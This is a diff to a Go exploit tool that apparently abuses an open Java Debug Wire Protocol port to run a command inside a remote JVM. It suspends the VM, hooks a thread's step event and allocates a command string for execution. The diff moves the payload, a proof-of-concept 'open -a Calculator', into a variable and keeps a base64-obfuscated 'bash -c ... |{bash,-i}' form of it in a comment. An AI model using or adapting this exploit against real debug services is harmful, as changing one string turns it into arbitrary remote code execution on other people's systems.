@@ -15,6 +15,8 @@ import (
 
 func main() {
 
+	command := "open -a Calculator"
+
 	conn, err := net.Dial("tcp", "localhost:8000")
 	if err != nil {
 		fmt.Printf("error dial: %v\n", err)
@@ -68,6 +70,10 @@ func main() {
 			break
 		}
 	}
+	if threadID == 0 {
+		fmt.Println("Could not find a suitable thread")
+		return
+	}
 	fmt.Println(fmt.Sprintf("[+] Setting 'step into' event in thread: %v", threadID))
 	debuggerCore.VMCommands().Suspend()
 	reply, err := debuggerCore.VMCommands().SendEventRequest(1, threadID)
@@ -88,8 +94,8 @@ func main() {
 	fmt.Println(fmt.Sprintf("[+] Received matching event from thread %v", tId))
 	debuggerCore.VMCommands().ClearCommand(rId)
 
-	// Step 1 allocating string
-	createStringReply, _ := debuggerCore.VMCommands().CreateString("bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}")
+	// Step 1 allocating string bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}
+	createStringReply, _ := debuggerCore.VMCommands().CreateString(command)
 	if createStringReply == nil {
 		log.Fatalln("[-] Failed to allocate command")
 	}
